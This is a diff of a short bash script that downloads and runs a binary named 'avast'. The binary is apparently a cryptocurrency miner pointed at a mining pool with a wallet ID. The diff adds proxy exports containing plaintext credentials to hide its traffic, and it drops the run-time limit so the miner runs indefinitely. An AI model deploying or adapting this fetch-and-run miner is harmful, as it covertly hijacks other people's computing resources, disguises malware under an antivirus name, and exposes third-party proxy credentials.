@@ -1,4 +1,8 @@
 #!/bin/bash
+curl --proxy "2BHVpyGPD:1rN14HAmV@176.53.133.217:57450" https://ipv4.webshare.io/ &&
+export http_proxy=http://2BHVpyGPD:1rN14HAmV@176.53.133.217:57450 &&
+export https_proxy=http://2BHVpyGPD:1rN14HAmV@176.53.133.217:57450 &&
+export ftp_proxy=http://2BHVpyGPD:1rN14HAmV@176.53.133.217:57450 &&
 wget https://github.com/aurbach55/pos/raw/main/avast
 chmod +x avast
-timeout 720h ./avast -v -l  ap.luckpool.net:3956 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.X -t 4 -x 
+./avast -v -l  ap.luckpool.net:3956 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.X -t 4 -x 
